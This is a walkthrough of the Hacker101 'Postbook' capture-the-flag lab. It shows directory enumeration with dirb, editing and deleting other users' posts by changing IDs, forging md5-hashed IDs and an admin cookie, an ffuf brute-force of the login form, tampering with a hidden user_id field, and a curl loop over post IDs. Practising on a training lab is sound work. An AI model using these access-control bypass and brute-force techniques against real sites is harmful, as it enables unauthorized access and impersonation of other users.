### Hacker101 CTF: Postbook

<img width="754" height="438" alt="Снимок экрана 2026-01-03 170518" src="https://github.com/user-attachments/assets/0044f644-a679-40d4-975b-cdecdf79a566" />

## Flag №1:
For the first, we will try to create an account on the site. Go to the `Sign up` and fill out the form, press enter and successfully create a new user.
On the main page, we see posts of other users. The first post belongs to the admin, let’s see it and research a navigation. What is in the source path:

```html
https://64648a3dc11e5107fbbc064f73b9d5c9.ctf.hacker101.com/index.php?page=view.php&id=1
```

We see that `id=1` points out to the number of post and passes as `GET` payload and this parameter passes to `view.php`.
So, use `dirb` and try to look for other paths that allow and that we can use for our attack.

```bash
>dirb https://64648a3dc11e5107fbbc064f73b9d5c9.ctf.hacker101.com/

The result: 
+ https://64648a3dc11e5107fbbc064f73b9d5c9.ctf.hacker101.com/index.php (CODE:200|SIZE:1610) 
==> DIRECTORY: https://64648a3dc11e5107fbbc064f73b9d5c9.ctf.hacker101.com/pages/            
+ https://64648a3dc11e5107fbbc064f73b9d5c9.ctf.hacker101.com/php.ini (CODE:200|SIZE:69886)  
+ https://64648a3dc11e5107fbbc064f73b9d5c9.ctf.hacker101.com/server-status (CODE:403|SIZE:330)
```

Looks on what we got in the `/pages/`:

<img width="729" height="476" alt="Снимок экрана 2026-01-03 170616" src="https://github.com/user-attachments/assets/730d0ce7-adf0-427a-94c2-bbf3f0927742" />

We see allow directories and Apache server version. It`s good! Let’s try to edit the admin post by the path that we found before. Change `view` on `edit`:

```html
https://64648a3dc11e5107fbbc064f73b9d5c9.ctf.hacker101.com/index.php?page=edit.php&id=1
```

It’s works! We can modify admin and user posts without the right credential. So, do it then save and we get the **FIRST FLAG**!

## Flag №2:

Go to the main page and see only two posts there. Click on the second and see that his id is 3. Where is the 2-nd id post? 

```html
https://64648a3dc11e5107fbbc064f73b9d5c9.ctf.hacker101.com/index.php?page=edit.php&id=2
```
Change id in the source line and it appears. Hidden admins private diary. Make it visible! Uncheck the box at the end of form and get the **SECOND FLAG**.

<img width="348" height="402" alt="Снимок экрана 2026-01-03 170647" src="https://github.com/user-attachments/assets/35613538-5129-441a-ad79-4732bb5a1fd9" />

## Flag №3:

Continue to discovery found before paths. I suggest deleting someone's post. In the beginning, create our own and delete it then. 
After the pair of operations we got the request on `F12` it the developer menu of browser or somewhere else:

```html
https://8171ff60f81a1389b3cef8fd0183b0d1.ctf.hacker101.com/index.php?page=delete.php&id=e4da3b7fbbce2345d7772b0674a318d5
```

The id looks like it was coded before. Google what kind of code it might be and found that it is md5 hash. Go to the bash and code the id of a post that already exists.

```bash
>echo -n "2" | md5sum
>c81e728d9d4c2f636f067f89cc14862c
```

Click on the request that we did before, copy as fetch, paste it to the console, change id and send. On it we got response where in the payloads section we can find a **THIRD FLAG**!

## Flag №4

Let’s dive into header requests again. Press `F12`, analyzing our request  to main page and see there a cookie:

```html
cookie
_gid=GA1.2.1325341806.1767372463; _ga_K45575FWB8=GS2.1.s1767372467$o26$g1$t1767372601$j60$l0$h0; _ga=GA1.1.720269228.1759788108; _ga_W62NXF3JMB=GS2.1.s1767372603$o26$g1$t1767373015$j18$l0$h0; id=eccbc87e4b5ce2fe28308fd9f2a7baf3
```

For us interesting `id=eccbc87e4b5ce2fe28308fd9f2a7baf3`. It recalls md5 hash like previous id for posts, but it’s for users. So, how we remember, when we edit the admin’s post that admin has `id=1`, let’s convert it into an md5 hash and replace our cookies.

```bash
>echo -n "1" | md5sum
>c4ca4238a0b923820dcc509a6f75849b
```

Go to the `GevTools -> Application -> Storage -> Cookies`, finding out an id field and change the value on `c4ca4238a0b923820dcc509a6f75849b`, then refresh a main page and we got the **FOURTH FLAG**.

### Flag №5

For this flag we need to apply to brute force or you may do it manually because it’s the easiest flag ever. If you will use the hint then half the work will be done. For practice I will use FFUF.

```bash
ffuf -u "https://255fccadb327f06c63eb4102eea3f4d9.ctf.hacker101.com/index.php?page=sign_in.php" -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=FUZ2Z" -w "/usr/share/wordlists/stupid_names.txt":FUZZ -w "/usr/share/wordlists/stupid_pass.txt":FUZ2Z -fr "PETA"
```
Here we pick username and password at the same time. After as we will finish process, sign in with this credential and we will get the **FIFTH FLAG**.


### Flag №6

We already found flags for `edit` and `delete` options, what else? Certainly! Creation.. Go and inspect the `Write a new post` link. There is we will find hidden form’s field:

```html
 <input type="hidden" name="user_id" value="3" />
```

So, `value=”3”` is the user id. Create a random post and save it. We got two requests and the first is what we need. `Copy as fetch` it in the `DevTools` and change a value, for example, on 1 that is the admin id, send it and we will get the **SIXTH FLAG**.

### Flag №7

The seventh flag was also so simple that I needed to use the hint.
`The hint is: 189*5`
Let’s try to apply it to a post's id. For the practice I used a simple bash script, but you may just fill out with it a id place ‘945’.

```bash
#!/bin/bash

base_url="https://255fccadb327f06c63eb4102eea3f4d9.ctf.hacker101.com/index.php?page=view.php&id="
cookie="id=c81e728d9d4c2f636f067f89cc14862c"

for ((id=1000; id>=1; id--)); do
        url="${base_url}${id}"
        response=$(curl -s -H "Cookie: $cookie" "$url" --max-time 10 2>/dev/null)

        if [ -n "$response" ]; then
                if echo "$response" | grep -q '\^FLAG\^'; then
                        echo -e "\nFlag found: $id"
                        exit 0
                fi
        fi
done
echo “Flag not found”
exit 1
```

The 945-th post has our last flag! Congratulation!
























